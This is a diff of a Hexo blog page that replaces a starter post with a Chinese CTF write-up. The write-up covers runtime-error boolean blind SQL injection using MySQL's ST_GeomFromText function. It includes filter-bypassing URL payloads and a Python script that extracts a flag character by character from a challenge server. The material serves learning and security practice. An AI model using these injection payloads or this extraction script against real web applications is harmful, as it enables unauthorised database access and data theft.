@@ -17,20 +17,30 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>Hello World | Hexo</title>
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <title>我TMD烦死了学习笔记 | Hexo</title>
+  <meta name="description" content="我TMD烦死了学习笔记本题的解题思路是基于运行错误的Bool型盲注。 通过关键函数，可以绕过MYSQL语法检查，运行时候再出错。通过出错反馈进行布尔型盲注。 关键函数Spatial Functions 这里用到两个Spatial Functions的函数，分别是ST_GeomFromText 、 ST_MPointFromText。两个函数相似，后文都采取前者做题。ST_GeomFromText函">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2020/09/12/hello-world/index.html">
+<meta property="og:title" content="我TMD烦死了学习笔记">
+<meta property="og:url" content="http://example.com/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="我TMD烦死了学习笔记本题的解题思路是基于运行错误的Bool型盲注。 通过关键函数，可以绕过MYSQL语法检查，运行时候再出错。通过出错反馈进行布尔型盲注。 关键函数Spatial Functions 这里用到两个Spatial Functions的函数，分别是ST_GeomFromText 、 ST_MPointFromText。两个函数相似，后文都采取前者做题。ST_GeomFromText函">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-09-12T02:07:35.821Z">
-<meta property="article:modified_time" content="2020-09-12T02:07:35.821Z">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130002842993.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130002903117.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130002949249.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130003541395.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130003554123.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130003717068.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130003807669.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130003934772.png">
+<meta property="article:published_time" content="2021-01-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-30T17:06:55.243Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="学习笔记">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cr_7.gitee.io/git-hub-image/image-20210130002842993.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/2020/09/12/hello-world/index.html">
+  <link rel="canonical" href="http://example.com/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -338,16 +348,25 @@
 
   
   
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">我TMD烦死了学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">关键函数</span></a></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
 <main class="main" role="main">
   <div class="content">
-  <article id="post-hello-world" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-我TMD烦死了学习笔记" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      我TMD烦死了学习笔记
     </h1>
   
 
@@ -355,34 +374,68 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/09/12/hello-world/" class="article-date">
-	  <time datetime="2020-09-12T02:07:35.821Z" itemprop="datePublished">2020-09-12</time>
+	<a href="/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+	  <time datetime="2021-01-30T16:00:00.000Z" itemprop="datePublished">2021-01-31</time>
 	</a>
 </span>
         
         
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+  </span>
+
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/09/12/hello-world/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#comments" class="article-comment-link">Comments</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+        <h3 id="我TMD烦死了学习笔记"><a href="#我TMD烦死了学习笔记" class="headerlink" title="我TMD烦死了学习笔记"></a>我TMD烦死了学习笔记</h3><p>本题的解题思路是基于运行错误的Bool型盲注。</p>
+<p>通过关键函数，可以绕过MYSQL语法检查，运行时候再出错。通过出错反馈进行布尔型盲注。</p>
+<h5 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h5><p>Spatial Functions</p>
+<p>这里用到两个Spatial Functions的函数，分别是ST_GeomFromText 、 ST_MPointFromText。两个函数相似，后文都采取前者做题。ST_GeomFromText函数的作用就是将指定字符串转换成对应的几何值返回，还有一个就是空间参照系标识符，由参数srid指定。具体如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ST_GeomFromText(character-string[, srid])</span><br><span class="line">例： ST_GeomFromText(&#39;POINT(-122.34900 47.65100)&#39;, 4326)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>但是在这道题里面我们不是运用此函数转换空间几何值的功能，而是借助此函数能绕过MYSQL检查的性质解题。需要注意的是 ST_GeomFromText 针对的是 POINT() 函数， ST_MPointFromText 针对的是 MULTIPOINT() 函数的。</p>
+<p>用 ST_GeomFromText ()构造以下sql语句，查看是否可行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(abc123)&#39;)), 0);</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(abc123)&#39;)), 0);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| IF(0, ST_X(ST_GeomFromText(&#39;POINT(123)&#39;)), 0) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| 0 |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>我们知道，POINT()函数传入的必须是GIS的地理坐标。我们传入一个常量或者underfined类型（如上面的abc123），函数可以正常运行。</p>
+<p>这是在if(0)下试验的，换成if(1)后，再实验一波。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(abc123)&#39;)), 0);</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(abc123)&#39;)), 0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</span><br></pre></td></tr></table></figure>
+
+<p>明显，运行出错了。是因为POINT()函数里传入的不是规定数据类型而是abc123导致的。到这里，我们就可以确定，ST_GeomFromText函数可以绕过mysql检查，且在运行时会因为内部参数出错而报错。</p>
+<p>回到题目，在cat后面输入任何数字时，页面不变。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210130002842993.png" alt="image-20210130002842993"></p>
+<p>输入字母的时候，显示空白。<img src="http://cr_7.gitee.io/git-hub-image/image-20210130002903117.png" alt="image-20210130002903117"></p>
+<p>输入–的时候，发现换了一张图片</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210130002949249.png" alt="image-20210130002949249"></p>
+<p>经过简单的fuzz后，发现很多都被ban掉，出现乌克兰小乳猪</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210130003541395.png" alt="image-20210130003541395"></p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210130003554123.png" alt="image-20210130003554123"></p>
+<p>其中有过滤掉了空格，空格可以各种绕过。结合 ST_GeomFromText，构造payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?cat&#x3D;1%09and%09IF(0,ST_X(ST_GeomFromText(123)),0)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210130003717068.png" alt="image-20210130003717068"></p>
+<p>将if改位true即f(1)时，返回空白页面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?cat&#x3D;1%09and%09IF(1,ST_X(ST_GeomFromText(123)),0)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210130003807669.png" alt="image-20210130003807669"></p>
+<p>对此，可以编写py脚本，把flag一个字母一个字母得跑出来。</p>
+<p>编写的脚本中，由于空格被过滤掉了，所以使用Tab键代替空格。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author：Gqleung</span></span><br><span class="line"><span class="comment">#Email:  admin@plasf.cn</span></span><br><span class="line"><span class="comment">#blog:   http://www.plasf.cn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params">string</span>):</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		r = hex(ord(i));</span><br><span class="line">		r = r.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		result = result+r</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28000/index.php?cat=&quot;</span></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">70</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">		<span class="keyword">if</span> j ==<span class="string">&quot;&#123;&quot;</span> <span class="keyword">or</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">			j=<span class="string">&#x27;\\&#x27;</span>+j</span><br><span class="line">		payload = <span class="string">&quot;1	and	IF((select	flag	from	flag)	regexp	binary	%s,	ST_X(ST_GeomFromText(0x504F494E54286D61647329)),	0)&quot;</span>%(ord2hex(<span class="string">&quot;^&quot;</span>+result+j))</span><br><span class="line">		r = requests.get(url+payload);</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			result=result+j</span><br><span class="line">			print(result.replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210130003934772.png" alt="image-20210130003934772"></p>
 
       
     </div>
@@ -392,7 +445,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2020/09/12/hello-world/" title="Hello World" target="_blank" rel="external">http://example.com/2020/09/12/hello-world/</a>
+      <a href="http://example.com/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="我TMD烦死了学习笔记" target="_blank" rel="external">http://example.com/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -438,15 +491,20 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2020/09/15/SSRF/" title="SSRF"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2020/09/12/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" title="无参数RCE"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/12/23/%E6%9D%82%E9%A1%B9%EF%BC%88%E4%B8%80%EF%BC%89/" title="杂项（一）"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
     
   </ul>
   
